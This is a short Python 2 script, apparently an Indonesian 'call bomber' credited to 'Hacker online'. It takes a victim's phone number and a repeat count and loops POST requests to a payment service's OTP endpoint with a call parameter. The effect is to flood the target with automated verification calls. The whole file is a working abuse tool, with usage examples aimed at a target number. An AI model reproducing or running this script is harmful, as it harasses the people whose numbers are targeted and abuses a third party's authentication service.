#!/usr/bin/python
#-*-coding:utf-8-*-
# Coded By Hacker online
####################
__banner__="""
 ____                  _      _____      _ _ 
|  _ \                | |    / ____|    | | |
| |_) | __ _  ___ ___ | |_  | |     __ _| | |
|  _ < / _` |/ __/ _ \| __| | |    / _` | | |
| |_) | (_| | (_| (_) | |_  | |___| (_| | | |
|____/ \__,_|\___\___/ \__|  \_____\__,_|_|_|
---------------------------------------------
             | Coded By : Hacker online
             | Instagram : @Hackerindonesia157_
             | Facebook : Lao'neis agung
             *-------------------------------
"""
import sys,requests
def callpam():
    print __banner__
    bacot=sys.argv[1]
    ulangicok=sys.argv[2]
    numb=int(ulangicok)
    param = {'msisdn':bacot,'accept':'call'}
    count = 0
    while (numb > count):
        r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
        if "otp_attempt_left" in r.text:
            print "[%s] sukses cok !!"%count
        else:
            print "[%s] gagal cok !!"%count
        count=count+1
if __name__ == "__main__":
    if len(sys.argv) !=3:
        print __banner__
        print "[-] Cara Menggunakan: python "+sys.argv[0]+" nomer_target jumlah_spam"
        print "[+] Contoh : python "+sys.argv[0]+" 08696969xxx 69"
        sys.exit
    else:
        callpam()
